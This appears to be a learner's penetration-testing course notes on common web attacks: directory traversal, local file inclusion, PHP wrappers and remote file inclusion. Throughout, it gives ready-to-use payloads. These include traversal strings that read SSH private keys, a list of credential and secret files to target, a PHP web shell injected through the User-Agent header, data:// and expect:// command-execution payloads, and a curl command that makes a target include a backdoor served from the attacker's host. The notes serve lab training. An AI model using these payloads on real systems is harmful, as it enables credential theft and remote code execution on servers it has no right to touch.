# Module 9 Common Web Application Attacks

---
## 9.1 Directory Travel

```bash
#Use it whenever there is a .php at the end of the url or known dir traversal vuln
../../../../../../your/wanted/path

#Use this when the 1st method is not working '%2e' is encoded '.'
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/your/wanted/path

#Double encoded-variants for stricter filters (%252e)
%252e%252e/%252e%252e/%252e%252e/%252e%252e/your/wanted/path

#Example
http://192.168.247.16/meteor/index.php?page=admin.php?../../../../../../../../../../../../home/offsec/.ssh/id_rsa


```

---


### Important Directories (Linux)

/etc/passwd             # User accounts and home directories

/etc/shadow             # Hashed passwords (needs root)

/etc/hosts              # Internal hostnames and IPs

/etc/ssh/sshd_config    # SSH config — shows allowed users, port

/home/user/.ssh/id_rsa  # Private SSH keys

/var/log/apache2/access.log  # Web server logs — useful for log poisoning

/var/www/html/config.php     # Web app config — often has DB credentials

/proc/self/environ      # Environment variables — may contain secrets

/.env                   # App environment file — API keys, passwords


---

### Curl path as is

The curl --path-as-is option tells curl to bypass URL path normalization and transmit dot-dot (/../) or dot (/./) sequences directly to the server exactly as written

---


## 9.2.1 Local File inclusion (LFI)

Directory traversal > read
LFI > write (execute remote files, obtaining RCE)

Use revshells.com to create reverse shell payload

```bash
#Web shell payload, to insert at User-Agent:
User-Agent: <?php echo system($_GET['cmd']); ?>
```

Reverse shell — direct, no files needed, works when you already have code execution. 

Msfvenom — generates a payload file (exe, dll, php, etc) that you transfer to the target and execute. More powerful but requires getting a file onto the machine first.

---

### Server (sidenote)
Linux system -> Apache Server
Windows system -> XAMPP (Apache + MySQL + php)

---


## 9.2.2 PHP Wrappers

What they are:

PHP wrappers are built-in PHP protocols that let you access data in different ways beyond just local files. They start with scheme://.


data:// — lets you pass raw data as if it were a file. 
```bash
data://text/plain;base64,<encoded payload in base64>==&cmd=ls"
#encoded payload in base64 = <?php echo system($_GET['cmd']); ?>
```
Instead of including a file, you're passing PHP code directly. No log poisoning needed.


php://filter — lets you read file contents encoded in base64, bypassing certain filters:
```bash
?page=php://filter/convert.base64-encode/resource=/etc/passwd
Useful when the server strips PHP tags but you still want to read files.
```


expect:// — executes commands directly. Rarely enabled but worth trying:
```bash
?page=expect://id
```

> CMD encoded in URL
> Payload encoded in Base64, as mentioned in the line


When to use wrappers vs log poisoning:

- Try data:// first — it's simpler, no setup needed
- If data:// is blocked, fall back to log poisoning
- Use php://filter when you need to read source code of PHP files without executing them


How to identify if wrappers are allowed:

Just try them. If data:// executes your PHP, wrappers are enabled. If not, fall back to log poisoning.

> When using cyberchef, remember to turn off "strip HTML tags"

---

## 9.2.3 Remote File Inclusion (RFI)

RFI vulnerabilities allow us to include files from a remote system over HTTP or SMB.

```bash
#Setting up server, ensure your kali is on the right directory
kali@kali:/usr/share/webshells/php/$
python3 -m http.server 80

#Ensure you have your RCE file
kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php

#Abusing RFI on target web server
curl "http://mountaindesserts.local/meteor/index.php?page=http://<your.ip>/simple-backdoor.php"
#if your .php file has GET['cmd'], include &cmd at the end
```

---

